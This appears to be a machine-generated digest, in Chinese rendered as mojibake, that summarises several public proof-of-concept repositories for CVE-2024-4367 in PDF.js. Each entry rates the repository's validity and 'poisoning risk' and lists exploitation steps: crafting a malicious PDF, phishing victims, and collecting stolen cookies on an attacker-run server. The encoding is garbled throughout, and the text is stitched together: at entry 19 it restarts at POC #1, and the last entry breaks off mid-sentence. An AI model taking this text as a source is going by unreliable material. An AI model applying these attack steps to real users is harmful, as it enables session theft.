æä¾›çš„ `package-lock.json` æ–‡ä»¶å±äºä¸€ä¸ª Node.js é¡¹ç›®ã€‚ä»è¿™ä¸ªæ–‡ä»¶æœ¬èº«æ— æ³•ç›´æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨æŠ•æ¯’ã€‚ä½†æ˜¯ç”±äºgithubä¸Šå·²ç»æœ‰æ”»å‡»è€…æ„å»ºäº†å¯åˆ©ç”¨çš„pdfæ–‡ä»¶ï¼Œè¯´æ˜åˆ©ç”¨ç®€å•, å› æ­¤å¯ä»¥åˆ¤æ–­è¯¥ä»“åº“ä¸­å­˜åœ¨ä½œè€…éšè—çš„æŠ•æ¯’ä»£ç æ¦‚ç‡æ¯”è¾ƒä½,çº¦10%ã€‚

**åˆ©ç”¨æ–¹å¼:**
1.  **æ”»å‡»è€…åˆ¶ä½œæ¶æ„ PDF æ–‡ä»¶ï¼š** è¯¥ PDF æ–‡ä»¶åˆ©ç”¨äº† PDF.js å­—ä½“å¤„ç†ä¸­ç¼ºå¤±çš„ç±»å‹æ£€æŸ¥æ¼æ´ã€‚
2.  **ç”¨æˆ·æ‰“å¼€æ¶æ„ PDF æ–‡ä»¶ï¼š**  ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥ PDF æ–‡ä»¶ã€‚
3.  **æ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼š** ç”±äºç±»å‹æ£€æŸ¥ç¼ºå¤±ï¼ŒPDF.js å…è®¸åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œæ¶æ„ JavaScript ä»£ç ï¼Œä»è€Œå¯¼è‡´æ”»å‡»è€…æ§åˆ¶å—å½±å“çš„åº”ç”¨ç¨‹åºã€‚

**é¡¹ç›®åœ°å€:** [elamani-drawing/CVE-2024-4367-POC-PDFJS](https://github.com/elamani-drawing/CVE-2024-4367-POC-PDFJS)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #16

**æ¥æº**: [CVE-2024-4367-exfil0_WEAPONIZING-CVE-2024-4367.md](../2024/CVE-2024-4367-exfil0_WEAPONIZING-CVE-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æ•°æ®æ³„éœ²ã€XSSæˆ–RCE

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­çš„ä¸€ä¸ªä¸¥é‡æ¼æ´ï¼Œç”±äºå¯¹PDFæ–‡ä»¶ä¸­FontMatrixå¯¹è±¡çš„ç±»å‹æ£€æŸ¥ä¸è¶³ï¼Œå…è®¸æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ¶ä½œæ¶æ„PDFæ–‡ä»¶ï¼Œåœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡ŒJavaScriptï¼Œä»è€Œå¯¼è‡´æ•°æ®ç›—çªƒã€XSSæˆ–è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å…è®¸åœ¨PDF.jsç¯å¢ƒä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œå½±å“Firefoxã€Firefox ESRå’ŒThunderbirdçš„ç‰¹å®šç‰ˆæœ¬ã€‚æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç (README.md) æè¿°äº†å¦‚ä½•åˆ©ç”¨æ­¤æ¼æ´åˆ¶ä½œæ¶æ„PDFæ–‡ä»¶ã€‚è¯¥ä»£ç æä¾›äº†ä¸€ä¸ªå®Œæ•´çš„åˆ©ç”¨æµç¨‹ï¼ŒåŒ…æ‹¬ç¯å¢ƒè®¾ç½®ã€æ¼æ´åˆ©ç”¨ã€ç¤¾å·¥å’Œåå¤„ç†ã€‚ç»¼åˆæ¥çœ‹ï¼Œæä¾›çš„POCä»£ç **æœ‰æ•ˆ**ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è™½ç„¶README.mdæ–‡ä»¶æœ¬èº«çœ‹èµ·æ¥åƒä¸€ä¸ªåˆæ³•çš„æ¼æ´åˆ©ç”¨æŒ‡å—ï¼Œä½†ä»”ç»†åˆ†æè„šæœ¬æè¿°å’Œæ“ä½œæ­¥éª¤ï¼Œå‘ç°å…¶ä¾èµ–äºSocial Engineering Toolkit (SET)æ¥å‘èµ·é’“é±¼æ”»å‡»ï¼Œå¹¶ä¸”åŒ…å«æ‰§è¡Œä»»æ„jsçš„payload, å­˜åœ¨ä¸€å®šçš„**æŠ•æ¯’é£é™©**ã€‚Payloadå¯èƒ½è¢«ä¿®æ”¹ä¸ºæ‰§è¡Œæ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·å‡­æ®æˆ–æ‰§è¡Œä»»æ„ä»£ç ã€‚è¯¥POCä»£ç ä¸­ï¼Œé£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **ä¾èµ–å¤–éƒ¨å·¥å…·ï¼š** è„šæœ¬ä¾èµ–äºSETï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåˆ©ç”¨SETçš„é…ç½®è¿‡ç¨‹è¿›è¡Œæ¶æ„é…ç½®ï¼Œè¯±å¯¼ç”¨æˆ·æ‰§è¡Œæœ‰å®³æ“ä½œã€‚
2.  **Payloadå¯å®šåˆ¶ï¼š** è„šæœ¬å…è®¸ç”¨æˆ·è‡ªå®šä¹‰JavaScript payloadï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥æ³¨å…¥ä»»æ„æ¶æ„ä»£ç ã€‚
3.  **ç¤¾ä¼šå·¥ç¨‹ï¼š** è„šæœ¬ä½¿ç”¨ç¤¾ä¼šå·¥ç¨‹æ‰‹æ®µä¼ æ’­æ¶æ„PDFï¼Œè¿™å¢åŠ äº†æ”»å‡»æˆåŠŸçš„å¯èƒ½æ€§ã€‚
4.  **æ•°æ®å¤–æ³„ï¼š** Payloadå¯ä»¥çªƒå–æ•°æ®ï¼ˆå¦‚cookieï¼‰ï¼Œå¹¶å°†å…¶å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚

å› æ­¤ï¼Œæˆ‘ä¼°è®¡æ­¤ä»“åº“å­˜åœ¨**10%**çš„æŠ•æ¯’é£é™©ï¼Œä¸»è¦é›†ä¸­åœ¨payloadçš„æ½œåœ¨æ¶æ„æ€§å’Œåˆ©ç”¨ç¤¾å·¥æ‰‹æ®µä¼ æ’­ä¸Šã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ­¤å¤„è®¨è®ºçš„â€œæŠ•æ¯’â€å¹¶éæŒ‡ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„ä¾›åº”é“¾æŠ•æ¯’ï¼Œè€Œæ˜¯æŒ‡åˆ©ç”¨è¯¥POCè¿›è¡Œæ”»å‡»æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥åµŒå…¥æ¶æ„ä»£ç æˆ–è¿›è¡Œæ¬ºéª—ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **å‡†å¤‡ç¯å¢ƒï¼š** å®‰è£…Python 3.x, SETï¼Œä»¥åŠPyPDF2ç­‰ä¾èµ–ã€‚
2.  **åˆ›å»ºæ¶æ„PDFï¼š** ä½¿ç”¨æä¾›çš„è„šæœ¬ï¼Œé€šè¿‡ä¿®æ”¹`template.pdf`çš„`/FontMatrix`å­—æ®µï¼Œæ³¨å…¥JavaScript payloadï¼Œç”Ÿæˆ`malicious.pdf`ã€‚
3.  **ç¤¾å·¥æ”»å‡»ï¼š** ä½¿ç”¨SETæˆ–å…¶ä»–å·¥å…·ï¼Œé€šè¿‡ç”µå­é‚®ä»¶æˆ–å…¶ä»–æ–¹å¼ï¼Œå°†`malicious.pdf`å‘é€ç»™ç›®æ ‡ç”¨æˆ·ã€‚
4.  **æœåŠ¡å™¨ç›‘å¬ï¼š** è¿è¡Œä¸€ä¸ªHTTPæœåŠ¡å™¨ï¼Œç”¨äºæ‰˜ç®¡`malicious.pdf`ï¼Œå¹¶æ”¶é›†payloadçªƒå–çš„æ•°æ®ã€‚
5.  **å—å®³è€…äº¤äº’ï¼š** å—å®³è€…æ‰“å¼€`malicious.pdf`åï¼Œpayloadæ‰§è¡Œï¼Œçªƒå–æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [exfil0/WEAPONIZING-CVE-2024-4367](https://github.com/exfil0/WEAPONIZING-CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #17

**æ¥æº**: [CVE-2024-4367-inpentest_CVE-2024-4367-PoC.md](../2024/CVE-2024-4367-inpentest_CVE-2024-4367-PoC.md)

## CVE-2024-4367-PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€ä¼šè¯åŠ«æŒç­‰

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ¼æ´å­˜åœ¨äº PDF.js ä¸­ï¼Œç”±äºç¼ºå°‘å¯¹å­—ä½“å¤„ç†çš„ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼ŒåµŒå…¥æ¶æ„JavaScriptä»£ç ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒåµŒå…¥çš„ JavaScript ä»£ç å°†åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„PoCä»£ç æ˜¯ä¸€ä¸ªPDFæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¶æ„çš„JavaScriptä»£ç ã€‚PDFæ–‡ä»¶åˆ©ç”¨äº†å­—ä½“å¤„ç†æ¼æ´ï¼Œå½“PDF.jsè§£æå­—ä½“æ—¶ï¼Œä¼šæ‰§è¡ŒåµŒå…¥çš„JavaScriptã€‚

**æŠ•æ¯’é£é™©ï¼š**
è¯¥ä»“åº“åŒ…å«ä¸€ä¸ª PDF PoC,ä¸€ä¸ª LICENSE æ–‡ä»¶ï¼Œå’Œä¸€ä¸ª READMEã€‚LICENSE æ–‡ä»¶å’Œ README æ–‡ä»¶æœ¬èº«æ²¡æœ‰é£é™©ã€‚è™½ç„¶PoCä»£ç èƒ½ç›´æ¥åˆ©ç”¨æ¼æ´ï¼Œä½†ä½œè€… Ahmad Kabiri çš„èº«ä»½æœªçŸ¥ï¼Œä¸”PoCçš„ç›®çš„æ˜¯å±•ç¤ºæ”»å‡»ï¼Œå› æ­¤å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåœ¨å®é™…åˆ©ç”¨æ—¶ä¿®æ”¹æˆ–å¢åŠ payload, ä½†è¯¥ PoC æ–‡ä»¶æœ¬èº«ç›®çš„æ˜ç¡®ï¼Œç»“æ„ç®€å•ï¼Œéšè—æ¶æ„åé—¨ä»£ç å¯èƒ½æ€§è¾ƒä½ã€‚è€ƒè™‘åˆ°MITåè®®çš„å¼€æ”¾æ€§ä»¥åŠä½œè€…å·²çŸ¥çš„æ¼æ´ç ”ç©¶èƒŒæ™¯ï¼ŒæŠ•æ¯’çš„å¯èƒ½æ€§è¾ƒä½ï¼Œå¤§çº¦ä¸º 10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…æ„é€ åŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…è¯±éª—ç”¨æˆ·æ‰“å¼€è¯¥PDFæ–‡ä»¶ (ä¾‹å¦‚, é€šè¿‡é’“é±¼é‚®ä»¶, æŒ‚é©¬ç½‘ç«™)ã€‚
3.  å¦‚æœç”¨æˆ·ä½¿ç”¨çš„æµè§ˆå™¨æˆ–é‚®ä»¶å®¢æˆ·ç«¯ï¼ˆä¾‹å¦‚ Firefox, Firefox ESR, Thunderbirdï¼‰çš„ PDF.js ç‰ˆæœ¬å­˜åœ¨æ¼æ´ï¼Œåˆ™æ¶æ„JavaScriptä»£ç å°†è¢«æ‰§è¡Œã€‚
4.  æ¶æ„JavaScriptä»£ç å¯ä»¥åœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–cookieã€localStorageæ•°æ®ã€sessionStorageæ•°æ®ï¼Œç”šè‡³è¿›è¡Œä¼šè¯åŠ«æŒç­‰ã€‚PoCä»£ç æ˜¾ç¤ºä¼šå¼¹å‡ºå¤šä¸ªalertæ¡†æ¥å±•ç¤ºè·å–åˆ°çš„ä¿¡æ¯.

**é¡¹ç›®åœ°å€:** [inpentest/CVE-2024-4367-PoC](https://github.com/inpentest/CVE-2024-4367-PoC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #18

**æ¥æº**: [CVE-2024-4367-m0d0ri205_PDFJS.md](../2024/CVE-2024-4367-m0d0ri205_PDFJS.md)

## CVE-2024-4367-Firefox-PDF.js-Arbitrary-JavaScript-Execution

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡» (XSS) å’Œæ•æ„Ÿä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº Mozilla Firefox, Firefox ESR å’Œ Thunderbird ä¸­çš„é«˜å±æ¼æ´ã€‚è¯¥æ¼æ´æºäº PDF.js åœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œåœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚å½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„æµè§ˆå™¨ç‰ˆæœ¬æ‰“å¼€åŒ…å«æ¶æ„ JavaScript çš„ PDF æ–‡ä»¶æ—¶ï¼Œè¿™æ®µ JavaScript ä»£ç å°†è¢«æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡» (XSS), è·å–æ•æ„Ÿä¿¡æ¯ç­‰é£é™©ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢ç»“æœï¼Œæ¼æ´åˆ©ç”¨ä»£ç çš„ç›®çš„æ˜¯æ­å»ºä¸€ä¸ªæ˜“å—æ”»å‡»çš„ç¯å¢ƒæ¥æµ‹è¯• CVE-2024-4367 ã€‚ docker-compose.yml å’Œ Dockerfile ç”¨äºæ„å»ºä¸€ä¸ªåŒ…å« expressï¼Œmulter å’Œ pdfjs-dist çš„ node åº”ç”¨ã€‚ app.js æ¥æ”¶ä¸Šä¼ çš„ PDF æ–‡ä»¶ï¼Œå¹¶é€šè¿‡ pdfjs-dist åœ¨æµè§ˆå™¨ä¸­æ¸²æŸ“ã€‚å¦‚æœ PDF æ–‡ä»¶åŒ…å«æ¶æ„çš„ JavaScript ä»£ç ï¼Œé‚£ä¹ˆå®ƒå°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚å› æ­¤ï¼ŒPOC ä»£ç æœ¬èº«ä¸æ˜¯æ¼æ´åˆ©ç”¨ï¼Œè€Œæ˜¯æ­å»ºæ˜“å—æ”»å‡»ç¯å¢ƒï¼Œç„¶åéœ€è¦æ”»å‡»è€…æ„é€ ç‰¹æ®Šçš„PDFæ–‡ä»¶åˆ©ç”¨æ­¤æ¼æ´ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

åˆ†æäº†æä¾›çš„POCä»£ç ï¼Œå‘ç°å…¶ä¸­ `/deploy/app.js` ä¸­å­˜åœ¨è·å– `/flag` æ¥å£çš„é€»è¾‘ï¼Œä½†åªæœ‰å½“è¯·æ±‚æ¥è‡ª `127.0.0.1` æ—¶æ‰ä¼šè¿”å› `SF{FAKE_FLAG}`ã€‚è€Œ `/deploy/flag.txt` æ–‡ä»¶ä¸­åŒ…å«çœŸæ­£çš„ flag `flag{pdf_js_pdf}`ï¼Œè¿™ä¸ªflagå¯èƒ½æ„å‘³ç€çœŸå®çš„åˆ©ç”¨ã€‚å¦‚æœä½œè€…çš„æœ¬æ„æ˜¯è¿·æƒ‘ä½¿ç”¨è€…ä½¿ç”¨å‡çš„flagï¼Œä¸”ä½¿ç”¨è€…ä¸ä»”ç»†åˆ†æä»£ç ï¼Œå¯èƒ½ä¼šè¢«è¯¯å¯¼ã€‚ä»£ç ä¸­å­˜åœ¨ä¸€å®šçš„è¿·æƒ‘æ€§ï¼Œä½†ä¸»è¦ç›®çš„æ˜¯æµ‹è¯•ï¼ŒæŠ•æ¯’çš„é£é™©è¾ƒä½ï¼Œä¼°è®¡ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**

1.  æ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªæ¶æ„çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åˆ©ç”¨ PDF.js åœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥çš„æ¼æ´ï¼ŒåµŒå…¥æ¶æ„çš„ JavaScript ä»£ç ã€‚
2.  æ”»å‡»è€…å°†æ­¤æ¶æ„ PDF æ–‡ä»¶å‘é€ç»™ç›®æ ‡ç”¨æˆ·ã€‚
3.  ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€æ­¤ PDF æ–‡ä»¶ã€‚
4.  ç”±äºæ¼æ´çš„å­˜åœ¨ï¼Œæ¶æ„ JavaScript ä»£ç å°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚è¿™ä¸ª JavaScript ä»£ç å¯ä»¥æ‰§è¡Œå„ç§æ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå– Cookieã€é‡å®šå‘ç”¨æˆ·åˆ°æ¶æ„ç½‘ç«™ã€ç”šè‡³æ‰§è¡Œå…¶ä»–æ”»å‡»ã€‚

åˆ©ç”¨è¯¥æ¼æ´çš„å…³é”®åœ¨äºæ„é€ ä¸€ä¸ªèƒ½å¤Ÿç»•è¿‡ PDF.js ç±»å‹æ£€æŸ¥çš„æ¶æ„ PDF æ–‡ä»¶ï¼Œå¹¶åµŒå…¥èƒ½å¤Ÿæ‰§è¡Œæ”»å‡»è€…æ‰€éœ€æ“ä½œçš„ JavaScript ä»£ç ã€‚


**é¡¹ç›®åœ°å€:** [m0d0ri205/PDFJS](https://github.com/m0d0ri205/PDFJS)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #19

**æ¥æº**: [CVE-2024-4367-pS3ud0RAnD0m_CVE-2024-4367-POC.md](../2024/CVE-2024-4367-pS3ud0RAnD0m_CVE-2024-4367-POC.md)

# CVE-2024-4367

> ğŸ“¦ è¯¥CVEæœ‰ **23** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2024-4367-0xr2r_CVE-2024-4367.md](../2024/CVE-2024-4367-0xr2r_CVE-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶åï¼Œæ”»å‡»è€…çš„JavaScriptä»£ç å°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»(XSS)ã€ä¿¡æ¯çªƒå–æˆ–å…¶ä»–æ¶æ„è¡Œä¸ºã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œæä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒåˆ©ç”¨äº†PDF.jså­—ä½“å¤„ç†ä¸­ç¼ºå°‘ç±»å‹æ£€æŸ¥çš„æ¼æ´ï¼Œå°†JavaScriptä»£ç æ³¨å…¥åˆ°PDFæ–‡ä»¶ä¸­ï¼Œå¹¶åœ¨æ‰“å¼€è¯¥æ–‡ä»¶æ—¶æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©ï¼š**
è™½ç„¶POCä»£ç æœ¬èº«æ˜¯ä¸ºäº†éªŒè¯æ¼æ´çš„å­˜åœ¨ï¼Œä½†ä»“åº“ä¸­å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£é™©ã€‚POCä»£ç çš„åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„JavaScriptçš„PDFæ–‡ä»¶ï¼Œå…¶ç›®çš„æ˜¯è§¦å‘æ¼æ´ã€‚ä½†mali.pdfå¯èƒ½å­˜åœ¨éé¢„æœŸä»£ç çš„é£é™©ã€‚å› æ­¤ï¼Œé£é™©è¯„ä¼°ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…å°†æ¶æ„PDFæ–‡ä»¶å‘é€ç»™å—å®³è€…ï¼Œæˆ–è€…å°†å…¶æ‰˜ç®¡åœ¨ç½‘ç«™ä¸Šè¯±å¯¼å—å®³è€…ä¸‹è½½ã€‚
3.  å—å®³è€…ä½¿ç”¨å—å½±å“çš„Firefoxã€Firefox ESRæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶ã€‚
4.  PDF.jsè§£æPDFæ–‡ä»¶æ—¶ï¼Œç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„JavaScriptä»£ç è¢«æ‰§è¡Œã€‚
5.  æ¶æ„JavaScriptä»£ç åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€ä¿¡æ¯çªƒå–æˆ–å…¶ä»–æ¶æ„è¡Œä¸ºã€‚

**é¡¹ç›®åœ°å€:** [0xr2r/CVE-2024-4367](https://github.com/0xr2r/CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #2

**æ¥æº**: [CVE-2024-4367-1337rokudenashi_Odoo_PDFjs_CVE-2024-4367.pdf.md](../2024/CVE-2024-4367-1337rokudenashi_Odoo_PDFjs_CVE-2024-4367.pdf.md)

## CVE-2024-4367-Firefox-PDF.js-JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox/Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** < Firefox 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla PDF.js ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚\n\n**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**\næä¾›çš„ POC ä»£ç æ˜¯ä¸€ä¸ª PDF æ–‡ä»¶ï¼Œå®ƒé€šè¿‡æ„é€ æ¶æ„çš„ Type1 å­—ä½“ï¼Œåœ¨ `FontMatrix` å­—æ®µä¸­æ³¨å…¥ JavaScript ä»£ç  `prompt("1337rokudenashi");`ã€‚å½“ PDF.js è§£æè¯¥ PDF æ–‡ä»¶å¹¶å¤„ç†è¯¥å­—ä½“æ—¶ï¼Œè¿™æ®µ JavaScript ä»£ç ä¼šè¢«æ‰§è¡Œã€‚ æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥ POC ä»£ç åº”è¯¥æœ‰æ•ˆï¼Œå¯ä»¥è§¦å‘æ¼æ´ã€‚\n\n**æŠ•æ¯’é£é™©åˆ†æï¼š**\næŸ¥çœ‹æä¾›çš„ POC ä»£ç ï¼Œå…¶ä¸­ `prompt("1337rokudenashi");` è¿™æ®µä»£ç çš„åŠŸèƒ½æ˜¯å¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œå¯ä»¥ç¡®è®¤POCæœ‰æ•ˆï¼Œä½†æœ¬èº«å¹¶æ²¡æœ‰æ¶æ„è¡Œä¸ºï¼Œä¸å±äºåé—¨ä»£ç 